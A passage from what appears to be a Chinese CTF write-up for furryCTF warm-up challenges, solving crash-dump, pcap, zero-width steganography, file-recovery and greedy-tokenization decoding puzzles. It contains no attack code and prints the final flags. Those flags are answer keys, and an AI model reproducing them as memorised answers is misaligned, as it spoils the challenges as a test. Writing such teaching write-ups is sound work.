: Hypervisor.RootFlags.AccessStats</span><br><span class="line">    Value: 1</span><br><span class="line"></span><br><span class="line">    Key  : Hypervisor.RootFlags.CrashdumpEnlightened</span><br><span class="line">    Value: 1</span><br><span class="line"></span><br><span class="line">    Key  : Hypervisor.RootFlags.CreateVirtualProcessor</span><br><span class="line">    Value: 1</span><br><span class="line"></span><br><span class="line">    Key  : Hypervisor.RootFlags.DisableHyperthreading</span><br><span class="line">    Value: 0</span><br><span class="line"></span><br><span class="line">    Key  : Hypervisor.RootFlags.HostTimelineSync</span><br><span class="line">    Value: 1</span><br><span class="line"></span><br><span class="line">    Key  : Hypervisor.RootFlags.HypervisorDebuggingEnabled</span><br><span class="line">    Value: 0</span><br><span class="line"></span><br><span class="line">    Key  : Hypervisor.RootFlags.IsHyperV</span><br><span class="line">    Value: 1</span><br><span class="line"></span><br><span class="line">    Key  : Hypervisor.RootFlags.LivedumpEnlightened</span><br><span class="line">    Value: 1</span><br><span class="line"></span><br><span class="line">    Key  : Hypervisor.RootFlags.MapDeviceInterrupt</span><br><span class="line">    Value: 1</span><br><span class="line"></span><br><span class="line">    Key  : Hypervisor.RootFlags.MceEnlightened</span><br><span class="line">    Value: 1</span><br><span class="line"></span><br><span class="line">    Key  : Hypervisor.RootFlags.Nested</span><br><span class="line">    Value: 0</span><br><span class="line"></span><br><span class="line">    Key  : Hypervisor.RootFlags.StartLogicalProcessor</span><br><span class="line">    Value: 1</span><br><span class="line"></span><br><span class="line">    Key  : Hypervisor.RootFlags.Value</span><br><span class="line">    Value: 1015</span><br><span class="line"></span><br><span class="line">    Key  : Hypervisor.RootFlags.ValueHex</span><br><span class="line">    Value: 0x3f7</span><br><span class="line"></span><br><span class="line">    Key  : WER.System.BIOSRevision</span><br><span class="line">    Value: 1.23.0.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BUGCHECK_CODE:  116</span><br><span class="line"></span><br><span class="line">BUGCHECK_P1: ffffe30a4b8cd010</span><br><span class="line"></span><br><span class="line">BUGCHECK_P2: fffff8035ce14790</span><br><span class="line"></span><br><span class="line">BUGCHECK_P3: ffffffffc000009a</span><br><span class="line"></span><br><span class="line">BUGCHECK_P4: 4</span><br><span class="line"></span><br><span class="line">FILE_IN_CAB:  furryCTF.dmp</span><br><span class="line"></span><br><span class="line">DUMP_FILE_ATTRIBUTES: 0x21808</span><br><span class="line">  Kernel Generated Triage Dump</span><br><span class="line"></span><br><span class="line">FAULTING_THREAD:  ffffe30a86af3040</span><br><span class="line"></span><br><span class="line">VIDEO_TDR_CONTEXT: dt dxgkrnl!_TDR_RECOVERY_CONTEXT ffffe30a4b8cd010</span><br><span class="line">Symbol dxgkrnl!_TDR_RECOVERY_CONTEXT not found.</span><br><span class="line"></span><br><span class="line">PROCESS_OBJECT: 0000000000000004</span><br><span class="line"></span><br><span class="line">BLACKBOXACPI: 1 (!blackboxacpi)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BLACKBOXBSD: 1 (!blackboxbsd)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BLACKBOXNTFS: 1 (!blackboxntfs)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BLACKBOXPNP: 1 (!blackboxpnp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BLACKBOXWINLOGON: 1 (!blackboxwinlogon)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PROCESS_NAME:  System</span><br><span class="line"></span><br><span class="line">IP_IN_PAGED_CODE: </span><br><span class="line">nvlddmkm+1854790</span><br><span class="line">fffff803`5ce14790 488b05b9f28dff  mov     rax,qword ptr [nvlddmkm+0x1133a50 (fffff803`5c6f3a50)]</span><br><span class="line"></span><br><span class="line">STACK_TEXT:  </span><br><span class="line">ffffc982`1c9677d8 fffff803`43a2375d     : 00000000`00000116 ffffe30a`4b8cd010 fffff803`5ce14790 ffffffff`c000009a : nt!KeBugCheckEx</span><br><span class="line">ffffc982`1c9677e0 fffff803`43c97be6     : fffff803`5ce14790 ffffe30a`5b80b5a0 00000000`00000004 ffffe30a`4b8cd010 : dxgkrnl!TdrBugcheckOnTimeout+0x101</span><br><span class="line">ffffc982`1c967820 fffff803`43a324be     : 00000000`00000000 00000000`00002000 00000000`00000004 00000000`00000004 : dxgkrnl!ADAPTER_RENDER::Reset+0x232</span><br><span class="line">ffffc982`1c967850 fffff803`43a69375     : ffffe30a`00000100 00000000`00000000 ffffc982`00000000 00000000`00000000 : dxgkrnl!DXGADAPTER::Reset+0x59a</span><br><span class="line">ffffc982`1c9678e0 fffff803`43a694d2     : fffff803`b290ce60 00000000`00000000 ffffb881`c42d1100 fffff803`b29cfbc0 : dxgkrnl!TdrResetFromTimeout+0x15</span><br><span class="line">ffffc982`1c967910 fffff803`b1c3072c     : ffffe30a`86af3040 ffffe30a`478ddae0 ffffe30a`478dda00 fffff803`44b52750 : dxgkrnl!TdrResetFromTimeoutWorkItem+0x22</span><br><span class="line">ffffc982`1c967950 fffff803`b1ea007a     : ffffe30a`86af3040 ffffe30a`86af3040 fffff803`b1c30140 ffffe30a`478ddae0 : nt!ExpWorkerThread+0x5ec</span><br><span class="line">ffffc982`1c967b30 fffff803`b20a5db4     : ffffb881`c42d1180 ffffe30a`86af3040 fffff803`b1ea0020 00000000`0e5f57dc : nt!PspSystemThreadStartup+0x5a</span><br><span class="line">ffffc982`1c967b80 00000000`00000000     : ffffc982`1c968000 ffffc982`1c961000 00000000`00000000 00000000`00000000 : nt!KiStartSystemThread+0x34</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SYMBOL_NAME:  nvlddmkm+1854790</span><br><span class="line"></span><br><span class="line">MODULE_NAME: nvlddmkm</span><br><span class="line"></span><br><span class="line">IMAGE_NAME:  nvlddmkm.sys</span><br><span class="line"></span><br><span class="line">STACK_COMMAND: .process /r /p 0xffffe30a476cb040; .thread 0xffffe30a86af3040 ; kb</span><br><span class="line"></span><br><span class="line">FAILURE_BUCKET_ID:  0x116_IMAGE_nvlddmkm.sys</span><br><span class="line"></span><br><span class="line">OSPLATFORM_TYPE:  x64</span><br><span class="line"></span><br><span class="line">OSNAME:  Windows 10</span><br><span class="line"></span><br><span class="line">FAILURE_ID_HASH:  &#123;c89bfe8c-ed39-f658-ef27-f2898997fdbd&#125;</span><br><span class="line"></span><br><span class="line">Followup:     MachineOwner</span><br><span class="line">---------</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>对比furryCTF{system.exe_0x0000001A_2024.12.31-14:00:00_DPC_Notepad}这个格式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">出现问题的文件：IMAGE_NAME:  nvlddmkm.sys</span><br><span class="line">蓝屏错误代码：</span><br><span class="line">VIDEO_TDR_FAILURE (116)  &lt;--- 括号里的 116 就是十进制代码</span><br><span class="line">...</span><br><span class="line">BUGCHECK_CODE:  116      &lt;--- 这里确认</span><br><span class="line">提取结果： 116 (十进制) = 0x00000116 (十六进制)</span><br><span class="line">该文件的最后一次编译时间：lm v m nvlddmkm指令输入后运行</span><br><span class="line">Browse all global symbols  functions  data  Symbol Reload</span><br><span class="line">    Timestamp:        Tue Feb 11 13:40:16 2025 (67AAE2C0)  &lt;--- 就在这一行</span><br><span class="line">    CheckSum:         05B57FA7</span><br><span class="line">失败事件的缩写：</span><br><span class="line">*******************************************************************************</span><br><span class="line">*                        Bugcheck Analysis                                    *</span><br><span class="line">*******************************************************************************</span><br><span class="line"></span><br><span class="line">VIDEO_TDR_FAILURE (116)  &lt;--- 这里是全名</span><br><span class="line">这里用TDR</span><br><span class="line">当时正在使用的应用程序的名称：这里有点坑，需要一点阅读理解，“当前正在使用”，根据题目场景，当前正在进行碰撞，碰撞会想到啥，hash碰撞吧，想想常用的工具，hashcat就是答案</span><br></pre></td></tr></table></figure>

<p>最后整合一下，flag为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">furryCTF&#123;nvlddmkm.sys_0x00000116_2025.02.11-13:40:16_TDR_hashcat&#125;</span><br></pre></td></tr></table></figure>

<h3 id="4-IIS服务器"><a href="#4-IIS服务器" class="headerlink" title="4.IIS服务器"></a>4.IIS服务器</h3><p>题目描述：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">猫猫前段时间闲着没事搭建了一个IIS服务器。</span><br><span class="line"></span><br><span class="line">不过，最近猫猫发现，服务器上好像多了个文件……？</span><br></pre></td></tr></table></figure>

<p>用wireshark打开pcap文件</p>
<p>依旧先ctrl+f搜索flag,找到了交了但是是错的因为那只是一个人登录用的password</p>
<img src="/2026/01/03/furryCTF%E7%83%AD%E8%BA%AB%E8%B5%9Bwp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-01-03%20004312.png" class="" title="Wireshark搜索结果">

<p>确实被骗到了哈哈哈，诈骗的小曲</p>
<p>你观察就可以发现，流量大多数是TCP和http流，所以右键追踪流</p>
<img src="/2026/01/03/furryCTF%E7%83%AD%E8%BA%AB%E8%B5%9Bwp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-01-03%20004955.png" class="" title="追踪HTTP流">

<p>最后找到一个传了fl2g.txt的流量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /execute/f12g.txt HTTP/1.1</span><br><span class="line">Host: 26.114.202.3</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0.000474s</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">Content-Encoding: gzip</span><br><span class="line">Last-Modified: Wed, 10 Jul 2024 03:14:49 GMT</span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line">ETag: &quot;c0c41d5377d2da1:0&quot;</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Server: Microsoft-IIS/7.5</span><br><span class="line">X-Powered-By: ASP.NET</span><br><span class="line">Date: Wed, 10 Jul 2024 04:37:33 GMT</span><br><span class="line">Content-Length: 191</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0.000000s</span><br><span class="line">ZnVycnlDVEZ7RGlkX1lvdV9Ob3RlX1RoZV9EaWZmX0luX0Vycm9yX1BhZ2U/fQ==</span><br><span class="line">0.175592s</span><br><span class="line">GET /favicon.ico HTTP/1.1</span><br><span class="line">Host: 26.114.202.3</span><br><span class="line">Connection: keep-alive</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36</span><br><span class="line">Accept: image/avif,image/webp,image/apng,image/*,*/*;q=0.8</span><br><span class="line">Referer: http://26.114.202.3/execute/f12g.txt</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0.000349s</span><br><span class="line">HTTP/1.1 404 Not Found</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Server: Microsoft-IIS/7.5</span><br><span class="line">X-Powered-By: ASP.NET</span><br><span class="line">Date: Wed, 10 Jul 2024 04:37:34 GMT</span><br><span class="line">Content-Length: 1163</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0.000000s</span><br><span class="line">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;&gt;</span><br><span class="line">&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=gb2312&quot;/&gt;</span><br><span class="line">&lt;title&gt;404 - ..................&lt;/title&gt;</span><br><span class="line">&lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line">&lt;!--</span><br><span class="line">body&#123;margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;&#125;</span><br><span class="line">fieldset&#123;padding:0 15px 10px 15px;&#125; </span><br><span class="line">h1&#123;font-size:2.4em;margin:0;color:#FFF;&#125;</span><br><span class="line">h2&#123;font-size:1.7em;margin:0;color:#CC0000;&#125; </span><br><span class="line">h3&#123;font-size:1.2em;margin:10px 0 0 0;color:#000000;&#125; </span><br><span class="line">#header&#123;width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:&quot;trebuchet MS&quot;, Verdana, sans-serif;color:#FFF;</span><br><span class="line">background-color:#555555;&#125;</span><br><span class="line">#content&#123;margin:0 0 0 2%;position:relative;&#125;</span><br><span class="line">.content-container&#123;background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;&#125;</span><br><span class="line">--&gt;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id=&quot;header&quot;&gt;&lt;h1&gt;..........&lt;/h1&gt;&lt;/div&gt;</span><br><span class="line">&lt;div id=&quot;content&quot;&gt;</span><br><span class="line"> &lt;div class=&quot;content-container&quot;&gt;&lt;fieldset&gt;</span><br><span class="line">  &lt;h2&gt;404 - ..................&lt;/h2&gt;</span><br><span class="line">  &lt;h3&gt;......................................................&lt;/h3&gt;</span><br><span class="line"> &lt;/fieldset&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这个是不是很像base64啊，虽然不是Zmxh这种标准开头</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0.000000s</span><br><span class="line">ZnVycnlDVEZ7RGlkX1lvdV9Ob3RlX1RoZV9EaWZmX0luX0Vycm9yX1BhZ2U/fQ==</span><br></pre></td></tr></table></figure>

<p>解密之后得到flag(这里用随波逐流)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">furryCTF&#123;Did_You_Note_The_Diff_In_Error_Page?&#125;</span><br></pre></td></tr></table></figure>

<h3 id="5-盲盒"><a href="#5-盲盒" class="headerlink" title="5.盲盒"></a>5.盲盒</h3><p>题目描述：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">来开盲盒吧~nwn</span><br><span class="line"></span><br><span class="line">注：本题原本的flag格式为flag&#123;&#125;，因为懒得改附件了，所以找到flag后请将里面的“flag”修改为“furryCTF”</span><br><span class="line"></span><br><span class="line">比如flag&#123;Hi&#125;修改为furryCTF&#123;Hi&#125;即为正确答案。</span><br></pre></td></tr></table></figure>

<p>像这种word,excel,ppt这种题目，这种隐写的一般的处理方式就是把文件当压缩包去看</p>
<img src="/2026/01/03/furryCTF%E7%83%AD%E8%BA%AB%E8%B5%9Bwp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-01-03%20005452.png" class="" title="文件解压分析">


<p>直接用随波逐流的binwalk工具去分离</p>
<p>一个一个文件找啊找，看有没有和flag相关的</p>
<img src="/2026/01/03/furryCTF%E7%83%AD%E8%BA%AB%E8%B5%9Bwp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-01-03%20005630.png" class="" title="Binwalk分离结果">

<p>在sharedStrings里</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</span><br><span class="line">&lt;sst xmlns=&quot;http://schemas.openxmlformats.org/spreadsheetml/2006/main&quot; count=&quot;762826&quot; uniqueCount=&quot;2&quot;&gt;&lt;si&gt;&lt;t&gt;来开盲盒吧~&lt;/t&gt;&lt;phoneticPr fontId=&quot;1&quot; type=&quot;noConversion&quot;/&gt;&lt;/si&gt;&lt;si&gt;&lt;t&gt;flag        不在这&lt;/t&gt;&lt;phoneticPr fontId=&quot;1&quot; type=&quot;noConversion&quot;/&gt;&lt;/si&gt;&lt;/sst&gt;</span><br><span class="line">&lt;!-- ‬‌‬﻿﻿﻿‍‬‍‍‍‬‌﻿﻿﻿﻿﻿﻿﻿‌‌﻿‌‍‌﻿﻿‍‬‌‌‬‌﻿﻿﻿‍‬‌‍‍‌‬‌‬‬﻿‬‌‬﻿﻿﻿‍‌‍‌﻿‬﻿‍‍‬‬‌﻿﻿﻿‍‬‌‍﻿‍﻿‌‍﻿﻿‍‍﻿‌‌﻿‌‍‍‍‍﻿‌‬‬‌‬‌﻿﻿﻿‍‬‍‬‍‌‍﻿‌﻿‌‌‌‌‌‍‬﻿‬‌‌‌‌‍﻿‍﻿‌‌‌‌‍‬﻿‬‌‌‌‌‍﻿﻿‬‌‌‌‌‌‌‬‬‌‌‌‌‍‬‍‬‌‌‌‌‍‬﻿‌‌‌‌‌‍‬‌‍‌‌‌‌‍‬‍﻿‌‌‌‌‍﻿‬﻿‌‌‌‌‍‍‬‬我也没说‌‌‌‌‌﻿‌‍‌‌‌‌‌﻿‬‍‌‌‌‌‍‍﻿﻿‌‌‌‌‍‍‍‌‌‌‌‌‍‬‬‌‌‌‌‌‍‬‍‍‌‌‌‌‍‍﻿﻿‌‌‌‌‍‍‌﻿‌‌‌‌‍﻿‍‌‌‌‌‌‍﻿‌‬‌‌‌‌‌﻿‌‍‌‌‌‌‍‬﻿‬‌‌‌‌‍‬‍﻿‌‌‌‌‍‍﻿﻿flag‌‌‌‌‍‌‬‍‌‌‌‌‍‬﻿‬‌‌‌‌‍‍﻿﻿‌‌‌‌‍‌‍‍‌‌‌‌‍﻿‬‌在这呀‌‌‌‌‍‬‌﻿‌‌‌‌‌﻿‬‍nwn‌‌‌‌‍‬﻿‌‌‌‌‌‍﻿﻿‍，你不会想在这里找到flag叭~ --&gt;</span><br></pre></td></tr></table></figure>

<p>是不是很明显的零宽隐写</p>
<p>‬‍‌‌‌‌‍‬﻿‬‌‌‌‌‍‍﻿﻿‌‌‌‌‍‌‍‍‌‌‌‌‍﻿‬‌<!-- ‬‌‬﻿﻿﻿‍‬‍‍‍‬‌﻿﻿﻿﻿﻿﻿﻿‌‌﻿‌‍‌﻿﻿‍‬‌‌‬‌﻿﻿﻿‍‬‌‍‍‌‬‌‬‬﻿‬‌‬﻿﻿﻿‍‌‍‌﻿‬﻿‍‍‬‬‌﻿﻿﻿‍‬‌‍﻿‍﻿‌‍﻿﻿‍‍﻿‌‌﻿‌‍‍‍‍﻿‌‬‬‌‬‌﻿﻿﻿‍‬‍‬‍‌‍﻿‌﻿‌‌‌‌‌‍‬﻿‬‌‌‌‌‍﻿‍﻿‌‌‌‌‍‬﻿‬‌‌‌‌‍﻿﻿‬‌‌‌‌‌‌‬‬‌‌‌‌‍‬‍‬‌‌‌‌‍‬﻿‌‌‌‌‌‍‬‌‍‌‌‌‌‍‬‍﻿‌‌‌‌‍﻿‬﻿‌‌‌‌‍‍‬‬我也没说‌‌‌‌‌﻿‌‍‌‌‌‌‌﻿‬‍‌‌‌‌‍‍﻿﻿‌‌‌‌‍‍‍‌‌‌‌‌‍‬‬‌‌‌‌‌‍‬‍‍‌‌‌‌‍‍﻿﻿‌‌‌‌‍‍‌﻿‌‌‌‌‍﻿‍‌‌‌‌‌‍﻿‌‬‌‌‌‌‌﻿‌‍‌‌‌‌‍‬﻿‬‌‌‌‌‍‬‍﻿‌‌‌‌‍‍﻿﻿flag‌‌‌‌‍‌‬‍‌‌‌‌‍‬﻿‬‌‌‌‌‍‍﻿﻿‌‌‌‌‍‌‍‍‌‌‌‌‍﻿‬‌在这呀‌‌‌‌‍‬‌﻿‌‌‌‌‌﻿‬‍nwn‌‌‌‌‍‬﻿‌‌‌‌‌‍﻿﻿‍，你不会想在这里找到flag叭~ --></p>
<p>到网站里，随波逐流的就可以</p>
<img src="/2026/01/03/furryCTF%E7%83%AD%E8%BA%AB%E8%B5%9Bwp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-01-03%20005847.png" class="" title="零宽字符解密工具">

<p>然后你就看到flag了</p>
<img src="/2026/01/03/furryCTF%E7%83%AD%E8%BA%AB%E8%B5%9Bwp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-01-03%20005942.png" class="" title="解密后的Flag">

<p>flag为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;Z19_The_Str1ng_In_Exc9l&#125;</span><br></pre></td></tr></table></figure>

<h3 id="6-丢失的文档"><a href="#6-丢失的文档" class="headerlink" title="6.丢失的文档"></a>6.丢失的文档</h3><p>题目描述</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">因为一场停电，猫猫刚写了一半的小说无了……</span><br></pre></td></tr></table></figure>

<p>附件是一个asd文件其实我的第一想法就是改后缀，因为asd是一个不好处理陌生的格式，而这本来就应该是word文件，所以把后缀改为.docx打开，然后发现flag出了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">对应的flag为：</span><br><span class="line">furryCTF&#123;How_To_F1x_This_Wor6_D0cument&#125;</span><br><span class="line">123</span><br></pre></td></tr></table></figure>

<h3 id="7-大伙儿好像太无聊了那就整点无聊的东西（？"><a href="#7-大伙儿好像太无聊了那就整点无聊的东西（？" class="headerlink" title="7.大伙儿好像太无聊了那就整点无聊的东西（？"></a>7.大伙儿好像太无聊了那就整点无聊的东西（？</h3><p>题目描述：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">大概是一些无聊的产物（？</span><br><span class="line"></span><br><span class="line">猫猫的一点PS：有谁想读一遍这个玩意喵owo</span><br></pre></td></tr></table></figure>

<p>附件内容是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">REOREREREREREOREREREREREREOOOREOREREREREOREREREOREREREOOREOREREREREOREREREREREOREOREREREREOOREOREOREOOREREOOREOOREOREOREREREREOOREOREREREREREOREOOOREOREREREOREOOOOREREOREOREOOOREOREREREREREOREOOREOOREREOOREREREREREOREOREOOOOREREOOREREREOREREOOREREREOREREOREOOOOREREOREREREOREOREOREREOREREREREOOREREOOOREOOOREOREOREOREREOOOOREOREOOREREREREOOREOOREREREOOREOOREREREOREOREOREREREOOREREOOREREO</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="第一部分：把“贪心切分”聊得明明白白"><a href="#第一部分：把“贪心切分”聊得明明白白" class="headerlink" title="第一部分：把“贪心切分”聊得明明白白"></a>第一部分：把“贪心切分”聊得明明白白</h3><p>咱们把“贪心切分”这个词拆开，用大白话和生活中的例子来理解。</p>
<h4 id="1-什么是“切分”-Tokenization-？"><a href="#1-什么是“切分”-Tokenization-？" class="headerlink" title="1. 什么是“切分” (Tokenization)？"></a>1. 什么是“切分” (Tokenization)？</h4><p><strong>通俗解释：</strong><br>“切分”就是把一长串看起来乱糟糟的东西，按照某种规则，切成一个个有意义的“小块”。这个“小块”就叫 <strong>Token</strong>（记号）。</p>
<p><strong>生活中的例子：</strong><br>想象一下你读英文句子：<code>thisisasentence</code>。<br>你的大脑不会把它看成一堆字母，而是自动“切分”成单词：<code>this</code>, <code>is</code>, <code>a</code>, <code>sentence</code>。这里的每个单词，就是一个 Token。</p>
<p><strong>在这道题里：</strong><br>原始密文 <code>REORERER...</code> 就是那串长长的、没空格的句子。<br>通过观察，我们发现它好像不是由单个字母 <code>R, E, O</code> 构成的，而是由 <code>O</code> 和 <code>RE</code> 这两种“单词”拼起来的。<br>所以，“切分”就是要把 <code>REORER...</code> 切成 <code>[&#39;RE&#39;, &#39;O&#39;, &#39;RE&#39;, ...]</code> 这样一个“单词列表”。</p>
<h4 id="2-什么是“贪心”-Greedy-？"><a href="#2-什么是“贪心”-Greedy-？" class="headerlink" title="2. 什么是“贪心” (Greedy)？"></a>2. 什么是“贪心” (Greedy)？</h4><p><strong>通俗解释：</strong><br>“贪心”是一种非常直白、简单的做事策略，就是“<strong>只顾眼前，不看长远</strong>”。每一步都做出当下看起来最好的选择。</p>
<p><strong>生活中的例子：</strong><br>假设你要找零钱 87 分，你手头有面值为 25, 10, 5, 1 的硬币。<br>“贪心”的做法是：</p>
<ol>
<li>先拿出能用的最大面额：25分，还差 62 分。</li>
<li>再拿一个 25分，还差 37 分。</li>
<li>再拿一个 25分，还差 12 分。</li>
<li>25的用不了了，用下一个最大的：10分，还差 2 分。</li>
<li>10和5的都用不了，用 1分，还差 1 分。</li>
<li>再用 1分，找零完成。<br>你每一步都“贪心地”选了当前能用的最大面额，这就是贪心算法。</li>
</ol>
<p><strong>在这道题里：</strong><br>我们从字符串的开头 <code>s = &quot;REORER...&quot;</code> 开始切分：</p>
<ol>
<li><strong>指针在第 0 位 (<code>R</code>)</strong>：<ul>
<li>往前看 1 位是 <code>R</code>，它不是一个完整的“单词”（Token）。</li>
<li>往前看 2 位是 <code>RE</code>，它是一个完整的“单词”！</li>
<li><strong>贪心选择</strong>：我们选择匹配最长的那个，也就是 <code>RE</code>。</li>
<li>于是，第一个 Token 就是 <code>RE</code>。指针向后移动 2 位。</li>
</ul>
</li>
<li><strong>指针现在在第 2 位 (<code>O</code>)</strong>：<ul>
<li>往前看 1 位是 <code>O</code>，它是一个完整的“单词”。</li>
<li>往前看 2 位是 <code>OR</code>，它不是一个合法的“单词”。</li>
<li><strong>贪心选择</strong>：我们选择匹配 <code>O</code>。</li>
<li>第二个 Token 就是 <code>O</code>。指针向后移动 1 位。</li>
</ul>
</li>
<li><strong>如此循环…</strong> 直到把整个字符串切完。</li>
</ol>
<h4 id="3-什么情况下我能想到用“贪心切分”？"><a href="#3-什么情况下我能想到用“贪心切分”？" class="headerlink" title="3. 什么情况下我能想到用“贪心切分”？"></a>3. 什么情况下我能想到用“贪心切分”？</h4><p>这是解决问题的关键。你可以通过以下几点来判断：</p>
<ol>
<li><p><strong>特征一：由有限的几种“构件”组成。</strong><br>当你看到一长串文本，但翻来覆去就那么几种固定的“模式”或“片段”在重复出现时。比如这道题，看几眼就发现，除了 <code>O</code>，就是 <code>RE</code> 粘在一起。这强烈暗示了基本构件（Token）就是 <code>O</code> 和 <code>RE</code>。</p>
</li>
<li><p><strong>特征二：构件之间没有明显的“分隔符”。</strong><br>像摩斯电码，点划之间有短停顿，字母之间有长停顿。但这道题的 <code>RE</code> 和 <code>O</code> 是紧挨着的，<code>REO</code>、<code>ORE</code> 这样，没有空格或特殊符号隔开。这就逼着我们必须自己想办法把它们切开。</p>
</li>
<li><p><strong>特征三：构件之间没有“歧义”。</strong><br>“贪心”策略能成功，是因为它不会“切错”。比如，如果我们的“单词”是 <code>A</code> 和 <code>AB</code>，那么遇到 <code>AB</code> 时，如果贪心切了 <code>A</code>，剩下的 <code>B</code> 就无法处理了。<br>但在本题中，<code>O</code> 和 <code>RE</code> 这两个 Token 非常完美：</p>
<ul>
<li>一个以 <code>O</code> 开头。</li>
<li>一个以 <code>R</code> 开头。<br>它们的首字母完全不同，所以从任何位置开始，<strong>匹配哪个是唯一的，不存在二选一的困惑</strong>。这种没有歧义的情况，就是使用贪心切分最理想的场景。</li>
</ul>
</li>
</ol>
<p><strong>一句话总结：当你发现一个长字符串可以被一小组“没有歧义的、固定的小模式”完全拼成时，就应该立刻想到用“贪心切分”把它转换成一个“小模式”的序列，为后续解码铺路。</strong></p>
<hr>
<h3 id="第二部分：CyberChef-复现超详细步骤（带中间结果）"><a href="#第二部分：CyberChef-复现超详细步骤（带中间结果）" class="headerlink" title="第二部分：CyberChef 复现超详细步骤（带中间结果）"></a>第二部分：CyberChef 复现超详细步骤（带中间结果）</h3><p>下面我们一步步来，每一步都告诉你为什么这么做，以及做完后输出应该是什么样子。</p>
<p><strong>准备工作</strong>：打开 CyberChef 网站，把你的密文原文粘贴到右上角的 <strong>Input</strong> 框里。</p>
<p>网站地址：<a href="https://cyberchef.org/">https://cyberchef.org/</a></p>
<h4 id="步骤-1：Find-Replace-把-RE-换成-1"><a href="#步骤-1：Find-Replace-把-RE-换成-1" class="headerlink" title="步骤 1：Find &#x2F; Replace (把 RE 换成 1)"></a>步骤 1：Find &#x2F; Replace (把 <code>RE</code> 换成 <code>1</code>)</h4><ul>
<li><p><strong>操作</strong>：在左侧 <code>Operations</code> 搜索框里输入 <code>Find</code>，找到 <code>Find / Replace</code>，把它拖到中间的 <code>Recipe</code> 区域。</p>
</li>
<li><p><strong>配置</strong>：</p>
<ul>
<li>在 <code>Find</code> 框里，填入 <code>RE</code>。</li>
<li>在 <code>Replace</code> 框里，填入 <code>1</code>。</li>
<li>选项中，Global match,Case insensitive,Multiline matching全部打开就行</li>
</ul>
</li>
<li><p><strong>目的</strong>：这一步是执行我们的“映射”规则，把我们认定的第一个 Token <code>RE</code> 转换成二进制里的 <code>1</code>。</p>
</li>
<li><p><strong>中间结果</strong>：此时，右下角 <code>Output</code> 框的内容会变成：</p>
